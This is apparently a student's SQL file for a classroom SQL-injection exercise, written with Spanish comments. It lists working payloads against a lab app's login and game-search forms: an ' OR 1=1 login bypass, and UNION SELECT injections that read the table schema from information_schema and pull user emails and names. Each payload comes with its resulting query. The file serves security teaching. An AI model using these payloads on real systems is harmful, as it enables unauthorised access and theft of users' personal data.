-- primera prueba en la tarea 11.01 de inyección SQL
-- Inyección SQL en login de usuario
' OR 1=1 
--  En usuario y contraseña vacía:

SELECT * from usuario where correo='' OR 1=1 -- ' && contraseña='';

-- en el formulario de buscar juegos voy a sacar todos los juegos en vez de uno
' OR 1=1 #

SELECT * FROM juego WHERE descripcion = '' OR 1=1 #'



-- voy a sacar la estrucctura de la tabla juego 
' UNION SELECT 1, column_name, data_type, 0, 0, 0
      FROM information_schema.columns
            WHERE table_name = 'juego' #


SELECT * FROM juego WHERE descripcion = '' UNION SELECT 1, column_name, data_type, 0, 0, 0 FROM information_schema.columns WHERE table_name = 'juego' #'

-- sacar el gmail con el nombre de usuario a quien le pertenece 
' UNION SELECT  idUsuario, nombre, email, 0, idUsuario, 0 FROM usuarios #

  
SELECT * FROM juego WHERE descripcion = '' UNION SELECT idUsuario, nombre, email, 0, idUsuario, 0 FROM usuarios #'

-- voy a sacar los temas con su inforamcion

' UNION SELECT idTema, nombre, abreviatura, publico, idUsuario, 0 FROM tema #


SELECT * FROM juego WHERE descripcion = '' UNION SELECT idTema, nombre, abreviatura, publico, idUsuario, 0 FROM tema #'


